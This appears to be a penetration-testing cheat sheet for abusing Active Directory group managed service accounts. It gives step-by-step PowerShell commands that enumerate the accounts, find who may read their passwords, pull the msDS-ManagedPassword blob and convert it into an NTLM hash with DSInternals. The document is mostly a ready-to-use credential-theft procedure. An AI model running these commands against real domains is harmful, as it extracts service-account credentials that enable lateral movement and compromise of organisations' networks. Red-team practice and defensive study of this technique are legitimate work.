# Methodology
>1. Enumerate managed service accounts in the domain that have `msDS-GroupManagedServiceAccount` object class.
>2. Enumerate principals with the attribute `PrincipalsAllowedToRetrieveManagedPassword` that can read the password blob.
>3. Read the password.
>4. Convert the password to the NTLM hash equivalent since it can't be read.
---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## ADModule
**Find managed service accounts:**
```powershell
Get-ADServiceAccount -Filter *
```

**Find users who can read the password blob:**
```powershell
Get-ADServiceAccount -Identity server1 -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

**Read the blob:**
```powershell
$Passwordblob = (Get-ADServiceAccount -Identity server1 -Properties msDSManagedPassword).'msDS-ManagedPassword'
```

**Convert the password to NTLM hash:**
https://github.com/MichaelGrafnetter/DSInternals/releases
```powershell
Import-Module \DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```